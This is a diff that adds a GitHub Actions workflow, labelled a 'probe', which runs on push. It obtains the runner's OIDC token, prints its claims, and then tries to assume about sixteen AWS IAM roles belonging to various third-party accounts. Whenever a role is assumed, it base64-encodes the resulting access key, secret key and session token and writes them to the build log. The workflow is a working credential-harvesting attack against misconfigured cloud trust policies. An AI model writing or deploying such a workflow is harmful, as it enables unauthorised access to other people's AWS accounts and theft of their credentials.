@@ -1,0 +1,30 @@
+name: probe-i1844
+on: [workflow_dispatch, push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: oidc
+        run: |
+          set +e
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF"
+          TOK=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          if [ -z "$TOK" ] || [ "$TOK" = "null" ]; then echo "NO_OIDC"; exit 0; fi
+          echo "OIDC_TOKEN_LEN=${#TOK}"
+          echo "CLAIMS:"; echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          for ARN in arn:aws:iam::245716815044:role/github-role arn:aws:iam::818566830091:role/uquda-github-actions-deploy-dev arn:aws:iam::211125730365:role/btqa-github-deploy arn:aws:iam::222255905702:role/soleae-github-deploy arn:aws:iam::222255905702:role/soleae-web-deploy arn:aws:iam::296062593712:role/claude-code-bedrock-role arn:aws:iam::296062593712:role/github-actions-cua-fleets-wif-smoke arn:aws:iam::296062593712:role/github-actions-docs-pin-cua arn:aws:iam::296062593712:role/github-actions-ecr-push-cua arn:aws:iam::529088289252:role/CustomCrispDEVGitHubActionsRole arn:aws:iam::533267451842:role/ai-orch-terraform-deployer arn:aws:iam::864981749819:role/Customsupplier-risk-devGitHubActionsRole arn:aws:iam::974396334757:role/github-actions-infra-ci arn:aws:iam::975049931254:role/github-actions-image-resizer arn:aws:iam::146376036780:role/github-actions-bedrock arn:aws:iam::471112890962:role/github-actions-deploy; do
+            R=$(aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "p1844" --web-identity-token "$TOK" --duration-seconds 900 --output json 2>&1)
+            RC=$?
+            if [ $RC -eq 0 ]; then
+              echo "OK $ARN"
+              echo "$R" | jq -r '.Credentials.AccessKeyId,.Credentials.SecretAccessKey,.Credentials.SessionToken' | base64 -w0
+              echo
+            else
+              echo "TRY $ARN => $(echo "$R" | tr '\n' ' ' | head -c 240)"
+            fi
+          done
+          echo PROBE_DONE
